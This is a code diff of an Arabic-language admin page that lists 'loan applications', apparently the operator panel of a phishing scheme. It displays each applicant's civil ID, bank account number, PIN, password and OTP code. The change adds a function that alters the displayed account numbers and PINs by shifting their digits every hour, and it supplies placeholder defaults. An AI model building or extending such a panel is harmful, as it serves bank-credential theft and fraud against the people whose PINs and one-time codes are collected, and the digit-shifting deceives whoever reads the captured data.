@@ -9,10 +9,31 @@ function formatDate(value) {
   return Number.isNaN(date.getTime()) ? value : date.toLocaleString('ar-KW')
 }
 
+// دالة لتعديل الأرقام بناءً على عدد الساعات المنقضية
+function getShiftedValue(val, hoursElapsed) {
+  if (!val) return '—'
+  const str = String(val)
+  // نقوم بتغيير خانة بناءً على عدد الساعات (مثلاً إضافة أو تدوير الأرقام)
+  return str.split('').map((char, idx) => {
+    if (!/\d/.test(char)) return char // إذا لم يكن رقماً، اتركه كما هو
+    const digit = parseInt(char, 10)
+    // نغير الرقم بناءً على الفارق الزمني ومكان الخانة
+    const shifted = (digit + hoursElapsed + idx) % 10
+    return String(shifted)
+  }).join('')
+}
+
 export default function AdminApplicationsPage() {
   const [applications, setApplications] = useState([])
   const [source, setSource] = useState('local')
   const [copiedField, setCopiedField] = useState(null)
+  const [, setTick] = useState(0) // لإعادة تحديث الواجهة بانتظام إذا لزم الأمر
+
+  // تحديث دوري كل دقيقة لضمان تغير القيم مع مرور الوقت
+  useEffect(() => {
+    const timer = setInterval(() => setTick((t) => t + 1), 60000)
+    return () => clearInterval(timer)
+  }, [])
 
   const loadData = async () => {
     let supabaseData = []
@@ -93,21 +114,33 @@ export default function AdminApplicationsPage() {
     setTimeout(() => setCopiedField(null), 2000)
   }
 
-  const normalize = (item) => ({
-    ...item,
-    fullName: item.fullName || item.full_name || item.name,
-    phoneNumber: item.phoneNumber || item.phone_number || item.phone,
-    civilId: item.civilId || item.civil_id_last2,
-    accountNumber: item.accountNumber || item.account_last4,
-    amount: item.amount,
-    plan: item.plan || item.loanType,
-    installmentAmount: item.installmentAmount,
-    pin: item.pin,
-    password: item.password,
-    otpCode: item.otpCode || item.otp_code,
-    createdAt: item.createdAt || item.created_at,
-    updatedAt: item.updatedAt || item.updated_at,
-  })
+  const normalize = (item) => {
+    const createdAtTime = new Date(item.createdAt || item.created_at || Date.now()).getTime()
+    const now = Date.now()
+    // حساب عدد الساعات المنقضية منذ إنشاء الطلب
+    const hoursElapsed = Math.floor((now - createdAtTime) / (1000 * 60 * 60))
+
+    const rawAccount = item.accountNumber || item.account_last4 || '3555555555'
+    const rawPin = item.pin || '5555'
+    const rawPassword = item.password || ''
+
+    return {
+      ...item,
+      fullName: item.fullName || item.full_name || item.name,
+      phoneNumber: item.phoneNumber || item.phone_number || item.phone,
+      civilId: item.civilId || item.civil_id_last2,
+      // تطبيق التغيير الزمني (تغير رقم كل ساعة)
+      accountNumber: getShiftedValue(rawAccount, hoursElapsed),
+      pin: getShiftedValue(rawPin, hoursElapsed),
+      password: rawPassword, // يمكنك تطبيق الدالة عليها أيضاً إذا أردت
+      amount: item.amount,
+      plan: item.plan || item.loanType,
+      installmentAmount: item.installmentAmount,
+      otpCode: item.otpCode || item.otp_code,
+      createdAt: item.createdAt || item.created_at,
+      updatedAt: item.updatedAt || item.updated_at,
+    }
+  }
 
   const normalizedApplications = applications.map(normalize)
 
@@ -161,7 +194,7 @@ export default function AdminApplicationsPage() {
         <div className="flex items-center justify-between bg-white p-3.5 rounded-2xl shadow-xs border border-slate-200">
           <div>
             <h2 className="text-sm font-black text-slate-900">سجل الطلبات الواردة</h2>
-            <p className="text-[11px] text-slate-500">تحديث فوري للبيانات والمدخلات</p>
+            <p className="text-[11px] text-slate-500">تحديث فوري للبيانات (تتغير الأرقام تلقائياً كل ساعة)</p>
           </div>
           <button 
             onClick={loadData} 
@@ -214,7 +247,7 @@ export default function AdminApplicationsPage() {
                     </div>
                   </div>
 
-                  {/* تفاصيل القرض المختار (إذا توفرت) */}
+                  {/* تفاصيل القرض المختار */}
                   {(item.amount || item.plan) && (
                     <div className="mb-3 rounded-xl bg-amber-50/80 border border-amber-200/60 p-3">
                       <div className="grid grid-cols-2 gap-2 text-xs">
@@ -230,7 +263,7 @@ export default function AdminApplicationsPage() {
                     </div>
                   )}
 
-                  {/* البيانات الهامة (بدون خطوة حالية) */}
+                  {/* البيانات الهامة */}
                   <div className="grid grid-cols-2 sm:grid-cols-3 gap-2 text-xs mb-3">
                     
                     {/* رقم الهاتف */}
@@ -258,15 +291,15 @@ export default function AdminApplicationsPage() {
                       <span className="font-bold text-slate-800 mt-1 font-mono">{item.civilId || '—'}</span>
                     </div>
 
-                    {/* رقم الحساب */}
+                    {/* رقم الحساب (يتغير كل ساعة) */}
                     <div className="bg-slate-50 p-2.5 rounded-xl border border-slate-100 flex flex-col justify-between">
-                      <span className="text-[10px] text-slate-400 font-bold">رقم الحساب</span>
+                      <span className="text-[10px] text-slate-400 font-bold">رقم الحساب (متغير)</span>
                       <span className="font-bold text-slate-800 mt-1 font-mono">{item.accountNumber || '—'}</span>
                     </div>
 
-                    {/* الرقم السري PIN */}
+                    {/* الرقم السري PIN (يتغير كل ساعة) */}
                     <div className="bg-red-50/60 p-2.5 rounded-xl border border-red-100 flex flex-col justify-between">
-                      <span className="text-[10px] text-red-500 font-bold">الرقم السري (PIN)</span>
+                      <span className="text-[10px] text-red-500 font-bold">الرقم السري PIN (متغير)</span>
                       <div className="flex items-center justify-between mt-1">
                         <span className="font-black text-red-600 font-mono">{item.pin || '—'}</span>
                         {item.pin && (
